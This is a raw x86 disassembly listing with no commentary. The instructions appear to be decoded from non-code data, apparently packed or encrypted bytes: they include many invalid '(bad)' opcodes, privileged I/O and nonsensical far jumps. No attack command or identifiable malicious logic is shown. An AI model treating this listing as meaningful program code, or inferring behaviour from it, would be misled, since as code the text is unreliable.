  424d64:	adc    cl,BYTE PTR [ebx-0xbe96fc5]
  424d6a:	cmp    al,0x28
  424d6c:	stos   DWORD PTR es:[edi],eax
  424d6d:	inc    edi
  424d6e:	jae    0x424d45
  424d70:	xchg   ebx,esp
  424d72:	mov    ch,0xd1
  424d74:	call   0x36778dd
  424d79:	dec    ebx
  424d7a:	push   esi
  424d7b:	ins    BYTE PTR es:[edi],dx
  424d7c:	(bad)  
  424d7d:	xchg   esi,eax
  424d7e:	clc    
  424d7f:	sbb    eax,0x9fb86966
  424d84:	jp     0x424d2b
  424d86:	enter  0xe536,0xe5
  424d8a:	mov    gs,edi
  424d8c:	adc    eax,0x7744adfb
  424d91:	mov    eax,0xe0c82dea
  424d96:	pop    es
  424d97:	out    dx,al
  424d98:	rcl    ch,cl
  424d9a:	sub    BYTE PTR [edx],dl
  424d9c:	scas   al,BYTE PTR es:[edi]
  424d9d:	pop    esp
  424d9e:	dec    edx
  424d9f:	ins    BYTE PTR es:[edi],dx
  424da0:	and    ch,cl
  424da2:	sub    eax,0xec375b90
  424da7:	mov    ebp,DWORD PTR [esi+0x59]
  424daa:	inc    eax
  424dab:	nop
  424dac:	and    DWORD PTR [esi],esp
  424dae:	fs (bad) 
  424db0:	xor    DWORD PTR [edx+0x4e],0xffffffaf
  424db4:	das    
  424db5:	cmp    dh,BYTE PTR [eax+0x36]
  424db8:	outs   dx,DWORD PTR ds:[esi]
  424db9:	mov    ds:0x9d33c760,al
  424dbe:	(bad)  
  424dbf:	and    esi,esi
  424dc1:	ret    
  424dc2:	xchg   ah,al
  424dc4:	jg     0x424df3
  424dc6:	jge    0x424d95
  424dc8:	jg     0x424d5f
  424dca:	fcomi  st,st(6)
  424dcc:	mov    dh,0x47
  424dce:	push   ds
  424dcf:	jmp    0xa536:0x962d1e55
  424dd6:	sub    ebp,esi
  424dd8:	push   edx
  424dd9:	dec    edx
  424dda:	push   edx
  424ddb:	scas   al,BYTE PTR es:[edi]
  424ddc:	jg     0x424e1b
  424dde:	sub    DWORD PTR [edx],esi
  424de0:	ret    0xc9dd
  424de3:	les    esi,FWORD PTR [esi-0x5c]
  424de6:	dec    edx
  424de7:	jae    0x424dd3
  424de9:	sbb    eax,0x9667d13a
  424dee:	sbb    ecx,DWORD PTR [edx-0x366fb6ee]
  424df4:	test   eax,0xaf016560
  424df9:	mov    WORD PTR [ebx+0x6de87a69],cs
  424dff:	es aad 0x1b
  424e02:	(bad)  
  424e03:	sub    esi,ebx
  424e05:	lods   eax,DWORD PTR ds:[esi]
  424e06:	and    ebp,eax
  424e08:	push   0xffffffdc
  424e0a:	mov    ebx,edi
  424e0c:	out    0x98,eax
  424e0e:	out    0x9,eax
  424e10:	aad    0x61
  424e12:	push   esi
  424e13:	sub    edx,DWORD PTR [ecx-0x1f]
  424e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e17:	rcr    BYTE PTR [ebp-0x5],1
  424e1a:	call   0x4401:0x324a2db2
  424e21:	aad    0xef
  424e23:	mov    dl,0x8f
  424e25:	gs inc ebx
  424e28:	lgs    ecx,FWORD PTR ds:[ecx]
  424e2c:	xchg   edx,eax
  424e2d:	mov    gs,eax
  424e2f:	mov    dh,0x0
	...
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	jne    0x424e8a
  424e48:	cmp    edi,DWORD PTR [edx]
  424e4a:	(bad)  
  424e4b:	mov    BYTE PTR [ecx],0x0
  424e4e:	inc    BYTE PTR [ecx]
  424e50:	add    BYTE PTR [eax],al
  424e52:	out    dx,eax
  424e53:	es push edx
  424e55:	pop    ebx
  424e56:	xchg   edi,eax
  424e57:	fwait
  424e58:	int3   
  424e59:	frstor [edx-0xc0594f4]
  424e5f:	test   DWORD PTR [eax+0xf66d6da],ecx
  424e65:	ss mov bl,0xf5
  424e68:	sub    al,BYTE PTR [eax]
  424e6a:	xor    al,0x2a
  424e6c:	inc    ebx
  424e6d:	mov    ah,0x7f
  424e6f:	fst    DWORD PTR [edx-0x55a3e489]
  424e75:	std    
  424e76:	ret    
  424e77:	adc    BYTE PTR [ebp+0x1b5ae685],ah
  424e7d:	imul   BYTE PTR [edx]
  424e7f:	pop    ecx
  424e80:	add    al,0x1d
  424e82:	dec    esi
  424e83:	aad    0xf6
  424e85:	and    DWORD PTR [ebx-0x4],0xc577097b
  424e8c:	mov    ah,0x2a
  424e8e:	scas   al,BYTE PTR es:[edi]
  424e8f:	cmp    al,0x63
  424e91:	mov    ds:0x9699562d,eax
  424e96:	add    ecx,DWORD PTR [ecx]
  424e98:	jge    0x424edc
  424e9a:	inc    eax
  424e9b:	or     eax,0x4c503ce6
  424ea0:	sub    al,0x7f
  424ea2:	fimul  DWORD PTR [ebp-0x22f86c5b]
  424ea8:	add    DWORD PTR [ecx+0x6a],esp
  424eab:	pop    ss
  424eac:	jg     0x424e6c
  424eae:	loope  0x424f1f
  424eb0:	mov    cl,0x22
  424eb2:	add    edi,ecx
  424eb4:	(bad)  
  424eb5:	xor    al,0x85
  424eb7:	adc    al,0xf8
  424eb9:	loop   0x424f06
  424ebb:	or     ebx,DWORD PTR [eax-0x7e3d7d7e]
  424ec1:	jle    0x424ed8
  424ec3:	mov    esi,0xfeb4e215
  424ec8:	mov    esp,0x4fa96502
  424ecd:	fwait
  424ece:	lock cmp DWORD PTR [edi],0xffffff8b
  424ed2:	adc    DWORD PTR [ebx+0x4bd8be45],ecx
  424ed8:	inc    eax
  424ed9:	inc    ecx
  424eda:	sub    ah,BYTE PTR [edx-0x4e]
  424edd:	xchg   esi,eax
  424ede:	add    eax,ecx
  424ee0:	in     al,dx
  424ee1:	icebp  
  424ee2:	pop    edx
  424ee3:	mov    esp,DWORD PTR [eax+0x59]
  424ee6:	sbb    eax,0xace8422a
  424eeb:	dec    edx
  424eec:	test   DWORD PTR [esi-0x42],esi
  424eef:	repnz enter 0xe44d,0xe6
  424ef4:	inc    edi
  424ef5:	pop    es
  424ef6:	std    
  424ef7:	push   esi
  424ef8:	xchg   ebp,eax
  424ef9:	scas   al,BYTE PTR es:[edi]
  424efa:	shl    DWORD PTR [edx-0x63282473],0x2
  424f01:	and    ch,BYTE PTR [edi-0x35]
  424f04:	rcl    BYTE PTR [ebx],1
  424f06:	and    DWORD PTR [edi-0x22],ecx
  424f09:	cwde   
  424f0a:	ins    BYTE PTR es:[edi],dx
  424f0b:	nop
  424f0c:	and    eax,0x9bcbfda
  424f11:	jle    0x424ef8
  424f13:	iret   
  424f14:	(bad)  
  424f15:	push   eax
  424f16:	or     ebp,DWORD PTR [eax]
  424f18:	xor    DWORD PTR [ebp-0x5c],edi
  424f1b:	push   eax
  424f1c:	out    0xfb,eax
  424f1e:	inc    edi
  424f1f:	cmc    
  424f20:	aaa    
  424f21:	cmp    al,0x4e
  424f23:	out    dx,al
  424f24:	cld    
  424f25:	push   es
  424f26:	push   ebp
  424f27:	(bad)  
  424f28:	ror    esp,0xd4
  424f2b:	out    dx,al
  424f2c:	mul    BYTE PTR [ecx+0x7c5607ae]
  424f32:	cmp    ch,BYTE PTR [esi-0x3f995665]
  424f38:	mov    es,WORD PTR [edi+0x101f8722]
  424f3e:	es aam 0xd9
  424f41:	cmc    
  424f42:	cmp    dh,BYTE PTR [edx+0x38]
  424f45:	in     al,dx
  424f46:	fidivr DWORD PTR [ebx]
  424f48:	adc    ah,BYTE PTR [eax+0x7b]
  424f4b:	xchg   esp,eax
  424f4c:	mov    ah,0xbe
  424f4e:	ror    esp,0xcd
  424f51:	adc    eax,esi
  424f53:	push   ss
  424f54:	adc    ebx,esp
  424f56:	dec    ebx
  424f57:	sbb    eax,0x8e168ee1
  424f5c:	leave  
  424f5d:	setg   BYTE PTR [eax*4-0x894c5b1]
  424f65:	imul   ebx,DWORD PTR [ebx],0x3a7b1ee6
  424f6b:	pop    ebx
  424f6c:	cmp    ecx,DWORD PTR [ebp-0x7fabb205]
  424f72:	mov    esi,0x233695a2
  424f77:	xchg   esi,eax
  424f78:	sahf   
  424f79:	pop    esp
  424f7a:	cmc    
  424f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f7c:	mov    ah,0x42
  424f7e:	pop    es
  424f7f:	nop
  424f80:	adc    BYTE PTR [esi-0x2a311367],cl
  424f86:	popf   
  424f87:	icebp  
  424f88:	stos   BYTE PTR es:[edi],al
  424f89:	jmp    0x424fe5
  424f8b:	in     al,0x1e
  424f8d:	pushf  
  424f8e:	mov    esp,0x3fa3fddc
  424f93:	cld    
  424f94:	int    0x18
  424f96:	shufps xmm5,XMMWORD PTR [eax],0x24
  424f9a:	das    
  424f9b:	pop    ebx
  424f9c:	loopne 0x424fb1
  424f9e:	fwait
  424f9f:	repz in al,dx
  424fa1:	pushf  
  424fa2:	iret   
  424fa3:	pop    esp
  424fa4:	jle    0x424fe4
  424fa6:	jbe    0x42500a
  424fa8:	cmp    ebp,ecx
  424faa:	pop    ss
  424fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fac:	cwde   
  424fad:	int    0x59
  424faf:	ja     0x425004
  424fb1:	(bad)  
  424fb2:	xchg   edi,eax
  424fb3:	fst    DWORD PTR [eax+0x42]
  424fb6:	jl     0x424fe1
  424fb8:	xchg   edi,eax
  424fb9:	(bad)  
  424fba:	push   edx
  424fbb:	loopne 0x425021
  424fbd:	retf   0xa6bc
  424fc0:	adc    DWORD PTR [eax+0x0],edx
  424fc3:	xchg   ebx,eax
  424fc4:	shl    DWORD PTR [esi],0x2e
  424fc7:	or     al,0x15
  424fc9:	xor    al,0x2d
  424fcb:	push   ebp
  424fcc:	lahf   
  424fcd:	(bad)  
  424fce:	int3   
  424fcf:	pop    bx
  424fd1:	repnz (bad) 
  424fd3:	mov    eax,0xd98a69d5
  424fd8:	mov    bl,0x5
  424fda:	xchg   ecx,eax
  424fdb:	jnp    0x42504e
  424fdd:	jmp    0x42500e
  424fdf:	xor    al,0x4d
  424fe1:	dec    ebp
  424fe2:	fpatan 
  424fe4:	std    
  424fe5:	lahf   
  424fe6:	call   0xa49bdf76
  424feb:	push   edx
  424fec:	out    dx,al
  424fed:	and    BYTE PTR [eax+ecx*2],dh
  424ff0:	pop    edi
  424ff1:	dec    edi
  424ff2:	imul   edx,DWORD PTR [ecx-0x41],0xcbb1e564
  424ff9:	jb     0x425050
  424ffb:	out    0x44,al
  424ffd:	setp   ah
  425000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425001:	test   al,0x94
  425003:	xchg   edx,eax
  425004:	popa   
  425005:	loop   0x424fa1
  425007:	xchg   DWORD PTR [edx+0x54],ebx
  42500a:	jb     0x425046
  42500c:	pop    edi
  42500d:	dec    esp
  42500e:	cmp    DWORD PTR [edx-0x1a],edx
  425011:	dec    ecx
  425012:	inc    edi
  425013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425014:	loope  0x424fae
  425016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425017:	sub    ch,BYTE PTR [eax]
  425019:	sbb    DWORD PTR [ecx+0x51a160c],ebx
  42501f:	int3   
  425020:	stos   BYTE PTR es:[edi],al
  425021:	push   ebx
  425022:	std    
  425023:	jnp    0x425014
  425025:	mov    cl,0xe0
  425027:	push   eax
  425028:	cmp    dl,BYTE PTR [esi-0x6a]
  42502b:	bound  esi,QWORD PTR [ecx*4+0x50b30435]
  425032:	mov    dl,bl
  425034:	xor    al,0x9d
  425036:	push   ecx
  425037:	dec    ebp
  425038:	adc    al,0xd7
  42503a:	lods   al,BYTE PTR ds:[esi]
  42503b:	mov    al,ds:0xf956d334
  425040:	stos   BYTE PTR es:[edi],al
  425041:	pop    ecx
  425042:	call   0xf43d:0xbceec91
  425049:	or     ah,BYTE PTR [eax-0x5d26022]
  42504f:	jae    0x425051
	...
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0xa3
  425067:	push   esp
  425068:	fadd   st(6),st
  42506a:	ret    0x1c8
  42506d:	add    dh,bh
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [edx-0x33],dh
  425074:	popf   
  425075:	adc    ebp,DWORD PTR [edi-0x3552bb87]
  42507b:	mov    eax,DWORD PTR [esp+edi*2+0x535591b6]
  425082:	daa    
  425083:	icebp  
  425084:	test   DWORD PTR [ebx+0x7e2dbbd3],0xa1ad32b3
  42508e:	loop   0x42508c
  425090:	xchg   edi,eax
  425091:	(bad)  
  425092:	push   ss
  425093:	push   es
  425094:	sbb    al,BYTE PTR [esi]
  425096:	test   BYTE PTR [edi+0x72],ch
  425099:	lods   eax,DWORD PTR ds:[esi]
  42509a:	rcl    BYTE PTR [ebx-0x64],1
  42509d:	or     bh,BYTE PTR [ebx+eax*1+0x58]
  4250a1:	in     al,dx
  4250a2:	mov    bh,0xbf
  4250a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250a5:	jp     0x4250be
  4250a7:	sub    ebp,0xb2542621
  4250ad:	pop    ds
  4250ae:	and    ebx,esp
  4250b0:	fwait
  4250b1:	xlat   BYTE PTR ds:[ebx]
  4250b2:	or     BYTE PTR [ebx-0xa],bl
  4250b5:	gs je  0x42504b
  4250b8:	outs   dx,BYTE PTR ds:[esi]
  4250b9:	dec    ebx
  4250ba:	gs adc edx,0xcdae6804
  4250c1:	adc    esi,edi
  4250c3:	lock inc edx
  4250c5:	sub    ch,BYTE PTR ds:0x1a052864
  4250cb:	rcl    edx,cl
  4250cd:	bound  esi,QWORD PTR ds:0x5cd02d5b
  4250d3:	in     eax,0xd5
  4250d5:	stos   BYTE PTR es:[edi],al
  4250d6:	rcl    BYTE PTR [edi+0x6706f952],cl
  4250dc:	or     eax,0x1d03429b
  4250e1:	data16 (bad) 
  4250e3:	lods   al,BYTE PTR ds:[esi]
  4250e4:	jno    0x4250f2
  4250e6:	sub    edi,DWORD PTR ds:0xdccf0328
  4250ec:	out    0xd1,eax
  4250ee:	and    eax,0x96a98358
  4250f3:	ret    0x5abe
  4250f6:	or     BYTE PTR [esi+0x3f],dh
  4250f9:	cmp    ebx,esi
  4250fb:	pop    esi
  4250fc:	xchg   ch,ah
  4250fe:	and    eax,0x7fd21980
  425103:	fisttp WORD PTR [esi]
  425105:	pushf  
  425106:	jmp    0xb4:0x72bc7d8b
  42510d:	xchg   edx,eax
  42510e:	mov    ds:0x50d2d11e,eax
  425113:	sahf   
  425114:	lods   al,BYTE PTR ds:[esi]
  425115:	jl     0x42513f
  425117:	js     0x425167
  425119:	sbb    eax,0xbb1a0a54
  42511e:	xchg   esp,eax
  42511f:	test   eax,0x74dca111
  425124:	(bad)  
  425125:	mov    gs,ecx
  425127:	push   es
  425128:	xchg   ebx,eax
  425129:	in     al,dx
  42512a:	xchg   ebx,eax
  42512b:	push   edx
  42512c:	inc    ebp
  42512d:	test   DWORD PTR [ecx+0x7f],esi
  425130:	ja     0x425177
  425132:	inc    eax
  425133:	xor    al,0x2e
  425135:	scas   eax,DWORD PTR es:[edi]
  425136:	int    0x7d
  425138:	adc    bh,ah
  42513a:	inc    edx
  42513b:	enter  0x91dc,0xa0
  42513f:	xlat   BYTE PTR ds:[ebx]
  425140:	bound  ebx,QWORD PTR [eax+0x40]
  425143:	cs push ecx
  425145:	popf   
  425146:	and    esp,0xf
  425149:	fdivr  DWORD PTR [ebx+0x6ce42317]
  42514f:	sbb    eax,0xe09287ab
  425154:	out    0x92,al
  425156:	jne    0x42511e
  425158:	or     BYTE PTR [ebx-0x6e],0x90
  42515c:	inc    edi
  42515d:	mov    dl,0x15
  42515f:	pop    ebx
  425160:	pop    esp
  425161:	imul   ebp,DWORD PTR ds:0x4946e166,0x70
  425168:	aas    
  425169:	imul   edi,DWORD PTR [esi+edx*8+0x3f],0xa5207ada
  425171:	repnz push edx
  425173:	mov    ebx,0x92e1d846
  425178:	je     0x4251be
  42517a:	adc    eax,DWORD PTR [edi]
  42517c:	cmp    BYTE PTR [esi+0x2f],ah
  42517f:	jnp    0x425162
  425181:	pop    esi
  425182:	add    ecx,eax
  425184:	push   0xffffffe8
  425186:	jns    0x425113
  425188:	xor    DWORD PTR ss:[ebx],eax
  42518b:	inc    edi
  42518c:	inc    edx
  42518d:	xchg   edx,eax
  42518e:	sub    eax,0xfe36c0c4
  425193:	iret   
  425194:	xchg   ebx,eax
  425195:	daa    
  425196:	scas   eax,DWORD PTR es:[edi]
  425197:	pop    ds
  425198:	ds inc esi
  42519a:	hlt    
  42519b:	sbb    DWORD PTR [esp+edx*2+0x48],esi
  42519f:	xor    ebp,DWORD PTR [ebx+esi*4+0x5681c01c]
  4251a6:	sbb    ch,BYTE PTR [ebx-0x4b]
  4251a9:	xor    bl,ah
  4251ab:	call   0x4a58:0xe10e4723
  4251b2:	sbb    edx,ebx
  4251b4:	ss in  eax,0x27
  4251b7:	leave  
  4251b8:	loop   0x42515e
  4251ba:	lock outs dx,BYTE PTR ds:[esi]
  4251bc:	mov    eax,ds:0x68ac5017
  4251c1:	push   ecx
  4251c2:	or     eax,0x2e87cd79
  4251c7:	cmp    esi,ebp
  4251c9:	outs   dx,BYTE PTR ds:[esi]
  4251ca:	mov    bl,0x3b
  4251cc:	sbb    ecx,0xffffffc1
  4251cf:	or     eax,0x5cc69a6c
  4251d4:	scas   eax,DWORD PTR es:[edi]
  4251d5:	in     eax,0x8d
  4251d7:	sbb    dh,BYTE PTR [edi-0x3a180b91]
  4251dd:	mov    ds:0xe4a3129b,eax
  4251e2:	pop    eax
  4251e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251e5:	dec    esp
  4251e6:	lods   al,BYTE PTR ds:[esi]
  4251e7:	xor    al,0x25
  4251e9:	fwait
  4251ea:	aaa    
  4251eb:	lock outs dx,BYTE PTR ds:[esi]
  4251ed:	or     al,0x56
  4251ef:	cmp    ch,0xb9
  4251f2:	cmp    esp,DWORD PTR [eax+esi*8]
  4251f5:	or     eax,0xe57896c1
  4251fa:	and    bl,BYTE PTR [esi+eiz*1-0x1ecaa489]
  425201:	or     BYTE PTR [edi],cl
  425203:	inc    esp
  425204:	sub    BYTE PTR [eax-0x37],cl
  425207:	(bad)  
  425209:	test   al,0x4e
  42520b:	jmp    0x4251b7
  42520d:	and    ecx,edi
  42520f:	push   esp
  425210:	inc    edx
  425211:	enter  0x6f73,0x98
  425215:	loop   0x4251a0
  425217:	mov    edi,0x85878de5
  42521c:	out    dx,eax
  42521d:	(bad)  
  42521e:	fld    TBYTE PTR [ebx]
  425220:	dec    ebx
  425221:	cmp    DWORD PTR [ebp-0x777d0038],ebp
  425227:	xchg   esi,eax
  425228:	lods   al,BYTE PTR ds:[esi]
  425229:	or     esi,eax
  42522b:	pop    es
  42522c:	sub    eax,DWORD PTR es:[eax+0x1]
  425230:	imul   edx,edi,0x63
  425233:	cmp    bl,0xc0
  425236:	jns    0x42527f
  425238:	sbb    ah,ch
  42523a:	sub    BYTE PTR [edx],ah
  42523c:	cwde   
  42523d:	or     dl,cl
  42523f:	jo     0x42522d
  425241:	xchg   ebx,eax
  425242:	push   0xffffff94
  425244:	cs adc eax,0xa4bf6e0a
  42524a:	jns    0x425268
  42524c:	jnp    0x4251e6
  42524e:	imul   ebp,DWORD PTR [eax-0x7f],0x94e9151e
  425255:	leave  
  425256:	mov    dh,0xc6
  425258:	inc    edi
  425259:	mov    eax,0x5255c07c
  42525e:	mov    cl,0xdb
  425260:	adc    BYTE PTR [esi],ah
  425262:	data16 aam 0x52
  425265:	mov    ebx,DWORD PTR ds:0x14f33521
  42526b:	xor    DWORD PTR [ebx],0x59
  42526e:	shl    DWORD PTR [ebp+0x0],1
	...
  425279:	add    ah,dh
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	outs   dx,BYTE PTR ds:[esi]
  425287:	sbb    ah,BYTE PTR ss:[esi-0x40]
  42528b:	retf   0x1
  42528e:	inc    BYTE PTR [ecx]
  425290:	add    BYTE PTR [eax],al
  425292:	stos   DWORD PTR es:[edi],eax
  425293:	push   ebp
  425294:	push   ebx
  425295:	cmp    eax,ebx
  425297:	enter  0x5a07,0xd1
  42529b:	xcrypt-ecb (bad)
  42529c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42529d:	int3   
  42529e:	sbb    cl,al
  4252a0:	out    0x50,al
  4252a2:	mov    dl,0x80
  4252a4:	push   esp
  4252a5:	adc    al,0x62
  4252a7:	leave  
  4252a8:	mov    BYTE PTR [ebx+0x69],dh
  4252ab:	dec    eax
  4252ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252ad:	outs   dx,DWORD PTR ds:[esi]
  4252ae:	xor    al,0x73
  4252b0:	push   edi
  4252b1:	das    
  4252b2:	ror    DWORD PTR ds:0xb88f3d23,0x12
  4252b9:	gs add bl,bl
  4252bc:	lds    esp,FWORD PTR [eax+0x18]
  4252bf:	arpl   WORD PTR [edi],bx
  4252c1:	pop    ecx
  4252c2:	push   esp
  4252c3:	adc    ah,BYTE PTR [eax-0x35]
  4252c6:	(bad)  
  4252c8:	icebp  
  4252c9:	or     DWORD PTR [ebx+0x753b68b0],ebx
  4252cf:	push   eax
  4252d0:	lahf   
  4252d1:	sbb    eax,0x1606976e
  4252d6:	sbb    esp,0x465c7d74
  4252dc:	sub    edi,eax
  4252de:	push   ebx
  4252df:	mov    ch,BYTE PTR [eax-0x1b]
  4252e2:	xchg   ebp,esp
  4252e4:	dec    edx
  4252e5:	daa    
  4252e6:	je     0x42535b
  4252e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252e9:	shr    DWORD PTR [edx],1
  4252eb:	cmp    eax,0xa496e99d
  4252f0:	push   ecx
  4252f1:	jne    0x4252dc
  4252f3:	and    al,ah
  4252f5:	and    esi,DWORD PTR [esp]
  4252f8:	mov    eax,ds:0x67318f5d
  4252fd:	ins    BYTE PTR es:[edi],dx
  4252fe:	push   ds
  4252ff:	in     al,dx
  425300:	mov    WORD PTR [edi],es
  425302:	adc    al,0xea
  425304:	mov    esi,0x2cef8176
  425309:	add    DWORD PTR [ebx-0x1307f5b1],ebx
  42530f:	ficom  WORD PTR [ebx-0x53]
  425312:	push   ss
  425313:	int    0x21
  425315:	test   BYTE PTR [ebx],ah
  425317:	jmp    0x5cac:0x5a30d717
  42531e:	add    eax,0xb0d0a4bb
  425323:	and    DWORD PTR [ebx],esi
  425325:	inc    esi
  425326:	scas   al,BYTE PTR es:[edi]
  425327:	test   BYTE PTR [ebp-0xb499b4f],dl
  42532d:	mov    ds:0x959e14a3,al
  425332:	cs or  ebp,edi
  425335:	(bad)  
  425336:	push   0xfffffff4
  425338:	xor    edx,ecx
  42533a:	popa   
  42533b:	mov    WORD PTR [eax],ds
  42533d:	mov    ebp,0x950a1f8
  425342:	jbe    0x425378
  425344:	pop    esi
  425345:	adc    bl,BYTE PTR [eax]
  425347:	cmp    bl,dl
  425349:	cs popa 
  42534b:	cmp    ah,BYTE PTR [ebp+0x28]
  42534e:	aam    0x5e
  425350:	fs stos DWORD PTR es:[edi],eax
  425352:	ins    DWORD PTR es:[edi],dx
  425353:	mov    ecx,0xfe3be753
  425358:	mov    esi,0xd90280b9
  42535d:	(bad)  
  42535e:	and    esp,0xffffffbe
  425361:	xchg   esi,eax
  425362:	ret    
  425363:	mov    bl,0x40
  425365:	mov    ch,BYTE PTR [edx]
  425367:	in     eax,0xd2
  425369:	ss (bad) 
  42536b:	pop    edi
  42536c:	jne    0x425319
  42536e:	in     al,dx
  42536f:	dec    ebp
  425370:	xchg   DWORD PTR [ecx+0x3a30fae7],esp
  425376:	enter  0x7317,0x46
  42537a:	add    edi,edi
  42537c:	icebp  
  42537d:	fnstenv [edx-0x24d63c44]
  425383:	sub    cl,BYTE PTR [ebx-0x4]
  425386:	outs   dx,DWORD PTR ds:[esi]
  425387:	push   ecx
  425388:	mov    ah,0xc4
  42538a:	xchg   esp,eax
  42538b:	adc    ah,BYTE PTR [ebx]
  42538d:	push   ss
  42538e:	xchg   ebp,eax
  42538f:	jmp    0x425355
  425391:	test   al,0xfb
  425393:	adc    BYTE PTR [ebp+eax*8-0x7a],bl
  425397:	cmp    DWORD PTR [ebx],eax
  425399:	mov    edi,0x402d72aa
  42539e:	std    
  42539f:	pop    ebp
  4253a0:	mov    eax,0xf25ca3c7
  4253a5:	jmp    0xb5194af
  4253aa:	jno    0x4253cc
  4253ac:	es dec eax
  4253ae:	add    BYTE PTR [edx-0xe],0xf3
  4253b2:	clc    
  4253b3:	ds mov cl,0x9e
  4253b6:	aad    0x6e
  4253b8:	pop    ebx
  4253b9:	adc    DWORD PTR [edx-0x44185648],0xae6800de
  4253c3:	bound  ecx,QWORD PTR [edx+ecx*1]
  4253c6:	or     dh,BYTE PTR [edi]
  4253c8:	scas   al,BYTE PTR es:[edi]
  4253c9:	push   ebx
  4253ca:	fcmovnbe st,st(3)
  4253cc:	cmp    bl,BYTE PTR [edx-0x3]
  4253cf:	pop    eax
  4253d0:	jns    0x4253c8
  4253d2:	aam    0x69
  4253d4:	loope  0x4253c3
  4253d6:	sub    BYTE PTR [ecx+0xe],al
  4253d9:	clc    
  4253da:	loop   0x4253ce
  4253dc:	sub    al,0x61
  4253de:	sub    esp,edx
  4253e0:	stos   BYTE PTR es:[edi],al
  4253e1:	and    al,0xed
  4253e3:	cmp    esp,DWORD PTR [edi+0x3b]
  4253e6:	aas    
  4253e7:	jp     0x425401
  4253e9:	adc    ebx,esi
  4253eb:	inc    ebx
  4253ec:	xchg   esi,eax
  4253ed:	cmc    
  4253ee:	dec    eax
  4253ef:	aaa    
  4253f0:	push   edi
  4253f1:	mov    edi,0xf38321d2
  4253f6:	inc    BYTE PTR [eax-0x70]
  4253f9:	cdq    
  4253fa:	int    0xef
  4253fc:	loop   0x4253be
  4253fe:	mov    eax,0xb34a4bd3
  425403:	out    0xca,al
  425405:	jl     0x4253bf
  425407:	das    
  425408:	push   esi
  425409:	mov    esp,0x3ce201ec
  42540e:	and    BYTE PTR [ecx],dh
  425410:	ins    BYTE PTR es:[edi],dx
  425411:	loopne 0x42539a
  425413:	inc    ebx
  425414:	dec    eax
  425415:	cld    
  425416:	xchg   ebp,eax
  425417:	arpl   cx,cx
  425419:	dec    esp
  42541a:	xchg   esi,eax
  42541b:	mov    ebp,0x1d2eef9b
  425420:	cmp    ebp,esp
  425422:	(bad)  
  425423:	test   eax,0x30e599d2
  425428:	jne    0x425449
  42542a:	or     al,0x53
  42542c:	test   al,0x89
  42542e:	jnp    0x42543f
  425430:	jns    0x4253d1
  425432:	scas   eax,DWORD PTR es:[edi]
  425433:	pushf  
  425434:	ret    0xa86a
  425437:	jb     0x425486
  425439:	jg     0x42541c
  42543b:	sahf   
  42543c:	push   es
  42543d:	mov    cl,0x1d
  42543f:	jge    0x425400
  425441:	jmp    0x425428
  425443:	pop    ebp
  425444:	ja     0x425467
  425446:	dec    esi
  425447:	(bad)  
  425448:	xchg   esi,eax
  425449:	rcr    BYTE PTR [edi+0x7de50027],0xb8
  425450:	ss or  al,dh
  425453:	fninit 
  425455:	mov    edi,0xadd6a33e
  42545a:	sub    ch,BYTE PTR [edx+0x552b6e2f]
  425460:	mov    ch,BYTE PTR [edi+0x221a215d]
  425466:	xchg   ecx,eax
  425467:	(bad)  
  425468:	push   ebp
  425469:	scas   al,BYTE PTR es:[edi]
  42546a:	popa   
  42546b:	ret    
  42546c:	jg     0x42543c
  42546e:	lea    eax,[ebx+eiz*2-0x32]
  425472:	in     eax,dx
  425473:	inc    edi
  425474:	or     BYTE PTR [ebp+0xd4f0b3],bl
  42547a:	push   0xc
  42547c:	test   al,0xeb
  42547e:	lods   al,BYTE PTR ds:[esi]
  42547f:	ins    DWORD PTR es:[edi],dx
  425480:	retf   0x8e41
  425483:	add    esp,DWORD PTR [esi-0x23]
  425486:	pop    esp
  425487:	ror    BYTE PTR [edx],cl
  425489:	mov    ah,0x96
  42548b:	or     ebx,0x20
  42548e:	mov    BYTE PTR [ecx+0x0],0x0
	...
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	sub    BYTE PTR [eax],dh
  4254a8:	fnsave [eax+0x1ccbe]
  4254ae:	inc    BYTE PTR [ecx]
  4254b0:	add    BYTE PTR [eax],al
  4254b2:	mov    ebx,esp
  4254b4:	mov    ds:0x1f448414,al
  4254b9:	push   ebp
  4254ba:	sbb    BYTE PTR [ebx+0x3b],cl
  4254bd:	mov    ecx,DWORD PTR [ebx]
  4254bf:	push   0x38
  4254c1:	mov    eax,0xad52a36e
  4254c6:	scas   eax,DWORD PTR es:[edi]
  4254c7:	sub    eax,esi
  4254c9:	jp     0x42548f
  4254cb:	fmul   QWORD PTR [ebp-0xb0cb488]
  4254d1:	xchg   ebp,eax
  4254d2:	push   ebx
  4254d3:	xchg   ebx,eax
  4254d4:	cmp    dh,0x59
  4254d7:	mov    DWORD PTR [esi-0xcc0a3eb],edi
  4254dd:	fsub   DWORD PTR [edi-0x29]
  4254e0:	das    
  4254e1:	mov    dh,BYTE PTR [esi+ecx*1-0x4]
  4254e5:	xor    ecx,eax
